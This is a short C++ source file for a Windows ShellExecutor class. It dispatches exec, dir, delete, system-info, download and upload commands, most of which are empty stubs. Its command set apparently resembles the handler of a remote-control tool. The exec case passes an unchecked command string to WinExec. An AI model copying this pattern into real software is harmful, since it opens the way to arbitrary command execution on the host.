#include <windows.h>
#include "ShellExecutor.h"


ShellExecutor::ShellExecutor(void)
{

}


ShellExecutor::~ShellExecutor(void)
{

}

void ShellExecutor::ExecComm(ICommand* command, IResult* result)
{
	switch(command->getType())
	{

	case COM_EXEC:
		WinExec((LPCSTR)static_cast<ExecCommand*>(command)->getCommand(), SW_SHOW);
		break;

	case COM_DIR:
		static_cast<DirCommand*>(command)->getDir();
		break;

	case COM_DEL:
		static_cast<DelCommand*>(command)->getPath();
		break;

	case COM_SYS_INFO:
		break;

	case COM_DOWNLOAD:
		break;

	case COM_UPLOAD:
		break;

	default:
		break;
	}
}